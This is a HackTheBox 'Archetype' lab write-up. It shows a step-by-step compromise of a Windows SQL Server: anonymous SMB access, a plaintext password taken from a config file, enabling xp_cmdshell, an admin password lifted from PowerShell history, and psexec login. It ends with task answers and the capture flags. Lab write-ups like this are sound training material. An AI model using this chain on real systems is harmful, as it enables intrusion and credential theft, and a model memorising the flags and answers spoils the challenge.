TITLE: Archetype
CATEGORY: HackTheBox
DATE: 2026-05-07
IMAGE: ./assets/Archetype.png
---

# Start

1. started by doing an nmap scan of the traget machine 
```bash
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.142.167:1433: 
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.142.167:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-08T13:14:34
| Not valid after:  2056-05-08T13:14:34
| MD5:     1e35 3b8c 315e 632a 6121 284d 5682 d736
| SHA-1:   6c32 e2c8 d04d 94f0 5c00 d727 0358 64ad 4afa 7b58
|_SHA-256: 6506 3c80 2a4e ae53 8312 fcec 7ccf dda5 c1a5 8669 02a0 046b 1a43 b049 4c83 e46e
|_ssl-date: 2026-05-08T13:17:39+00:00; -1s from scanner time.
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-05-08T06:17:30-07:00
| smb2-time: 
|   date: 2026-05-08T13:17:31
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h23m59s, deviation: 3h07m50s, median: -1s

```
1. SMB
i found out that server uses SMB and mysql tryed to list the available account to login 
found this
```bash
Archetype smbclient -L 10.129.142.167 -N          

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.142.167 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
➜  Archetype smbclient //10.129.142.167/backups -N
Try "help" to get a list of possible commands.
smb: \> ls 
  .                                   D        0  Mon Jan 20 12:20:57 2020
  ..                                  D        0  Mon Jan 20 12:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 12:23:02 2020

		5056511 blocks of size 4096. 2569305 blocks available
smb: \> cat prod.dtsConfig
cat: command not found
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
smb: \> ls ../
  .                                   D        0  Mon Jan 20 12:20:57 2020
  ..                                  D        0  Mon Jan 20 12:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 12:23:02 2020

		5056511 blocks of size 4096. 2566383 blocks available
smb: \> cd ..
smb: \> ls 
  .                                   D        0  Mon Jan 20 12:20:57 2020
  ..                                  D        0  Mon Jan 20 12:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 12:23:02 2020

		5056511 blocks of size 4096. 2566383 blocks available
smb: \> exit 
➜  Archetype cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>#        

```
2. connect using mssql
```
# the password nad user are from the file that i got from the server
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.142.167 -windows-auth

#used this to know if ur sysadmin so we can shell into the server
SELECT IS_SRVROLEMEMBER('sysadmin');
it return 1 

```
3. shell
```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

xp_cmdshell "dir"
```
4. after this i check the powershell history
```
xp_cmdshell "type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
# the result
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!   
exit                                                                      
NULL  
``` 
5.  now we login as admin using username and password
```bash

mpacket-psexec administrator@10.129.142.167

```
## Tasks

1. Which TCP port is hosting a database server?
`
1433
`

2. What is the name of the non-Administrative share available over SMB?
`
backups
`

3. What is the password identified in the file on the SMB share?
`
M3g4c0rp123
`

4. What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?
`
mssqlclient.py
`

5. What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?
`
xp_cmdshell
`

6. What script can be used in order to search possible paths to escalate privileges on Windows hosts?
`
winpeas
`

7. What file contains the administrator's password?
`
ConsoleHost_history.txt
`

8. Submit user flag
`
3e7b102e78218e935bf3f4951fec21a3
`

9. Submit root flag
`
b91ccec3305e98240082d4474b848528
`
